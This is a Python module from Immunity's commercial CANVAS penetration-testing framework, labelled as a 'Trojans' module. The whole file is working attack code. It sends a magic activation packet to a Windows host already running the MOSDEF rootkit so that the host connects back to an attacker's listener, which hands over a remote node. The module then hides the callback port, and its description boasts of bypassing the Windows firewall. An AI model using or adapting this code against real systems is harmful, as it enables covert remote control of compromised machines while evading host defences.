#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if '.' not in sys.path: sys.path.append('.')

import random
import socket
import time

from exploitutils  import *
from canvaserror   import *
from canvasexploit import canvasexploit
from tcpexploit    import tcpexploit

NAME          = "activatenode"
VERSION       = "1.0"
DESCRIPTION   = "Sends an activation packet to a host that has the MOSDEF rootkit running. Returns a Win32Node. Can take up to 60 seconds." \
                "Doesn't matter if the remote host has the Windows firewall turned on, because our rootkit sits below it."

DOCUMENTATION={}
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://immunityinc.com/documentation/CANVAS_Rootkit.html'
DOCUMENTATION['VersionsAffected']='N/A'
DOCUMENTATION['CVE']='N/A'
DOCUMENTATION['NOTES']='This can be affected by AV products or anti-rootkit technologies.'


PROPERTY         = {}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]
NOTES            = ""


class theexploit(tcpexploit):
    def __init__(self):
        """ init """
        tcpexploit.__init__(self)
        
        self.result       = ""
        self.name         = NAME
        self.signature    = "metl"
        self.delimiter    = "|"
        self.magic_packet = ""
        self.port         = random.randint(1, 65535)
        self.postactions += [("mosdefmigrate", None)]
        #self.listenerArgsDict["fromcreatethread"]=1
        self.protocol     = 1
        return
    
    def test( self ):
        # For consistency
        return 1
    
    def getArgs(self):
        
        self.protocol    = self.argsDict.get("protocol",self.protocol)
        self.port        = int(self.argsDict.get("port", self.port))
        
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]
        
    def build_activation_packet(self):
        
        # Simple, for now the packet looks like this:
        # signature<delim>host IP<delim>port
        # metl|192.168.77.100|5555
        magic_packet  = self.signature
        magic_packet += self.delimiter
        magic_packet += self.callback.ip
        magic_packet += self.delimiter
        magic_packet += str(self.callback.port)
        magic_packet += "\x00"
        
        self.magic_packet = magic_packet

        # Setup the "hideport" postaction
        self.postactions += [("hideport", self.callback.port)]

        
        return
    
    
    def run(self):

        self.getArgs()
        
        self.host         = self.target.interface
        # This is pretty straightforward, just fire a UDP packet that has
        # an activation string and the host/port pair for the callback and 
        # wait for a connect-back to occur
        self.setInfo("%s (in progress)"%(NAME))
        
        # Setup and send the magic packet
        self.build_activation_packet()
        
        
        if self.protocol == 1:
            proto = "UDP"
            sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            proto = "TCP"
            sock  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        
        self.log("Attempting to send activation packet to %s:%d (%s)" % (self.host, self.port, proto))
            
        try:
            sock.connect((self.host, self.port))
        
        except socket.error:
            
            self.setInfo("%s - done (failed: Couldn't connect)"% NAME )
            return -1
            
        
        # The process if receiving a callback can take a bit of time
        # so we will loop a sleep call for 60 seconds
        sleep_count = 0
        
        self.log("Sending activation packet and waiting: ")
        while sleep_count <= 120:
            try:
                sock.send(self.magic_packet)
            except socket.error:
                pass
            
            self.log("Packet => [%d]" % sleep_count )
            
            if self.ISucceeded():
                self.log("Successfully activated the remote node.")
                self.result = 1
                self.setInfo("%s - done (success: %s)"%(NAME,self.result))
                       
                
                return 1
            else:
                time.sleep( 1 )
                sleep_count += 1
        
        # For whatever reason we weren't able to establish a callback     
        self.result = -1
        return -1

if __name__=='__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0,None]:
        ret.interact()
